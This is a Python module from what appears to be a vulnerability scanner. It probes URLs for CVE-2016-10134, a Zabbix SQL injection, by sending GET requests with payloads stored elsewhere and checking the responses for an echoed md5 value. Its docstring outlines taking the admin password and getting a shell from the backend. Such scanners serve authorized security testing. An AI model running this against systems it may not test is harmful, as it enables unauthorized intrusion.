#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from thirdparty import requests

def cve_2016_10134_scan(self, url):
    ''' latest.php中的toggle_ids[] 或 jsrpc.php中的profieldx2参数
            存在sql注入, 通过sql注入获取管理员账户密码, 进入后台进行getshell操作
    '''
    vul_info = {}
    vul_info['app_name'] = self.app_name
    vul_info['vul_type'] = 'SQLinject'
    vul_info['vul_id'] = 'CVE-2016-10134'
    vul_info['vul_method'] = 'GET'
    vul_info['headers'] = {}

    headers = self.headers.copy()
    headers.update(vul_info['headers'])

    for payload in self.cve_2016_10134_payloads:
        path = payload['path']
        data = payload['data']
        target = url + path

        vul_info['path'] = path
        vul_info['data'] = data
        vul_info['target'] = target

        try:
            res = requests.get(
                target, 
                timeout=self.timeout, 
                headers=headers,
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res.status_code, res)              # * LOG


            md = md5(str(self.random_num), 31)           # * 计算main.py随机数字的md5值, 取31位(0-30)

            if (md in res.text):  # * 如果计算的md5值, 在响应包的回显中找到了, 说明SQL注入的md5()函数执行了, 存在漏洞
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                    },
                    'Request': res
                }
                return results
        except requests.ConnectTimeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except requests.ConnectionError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
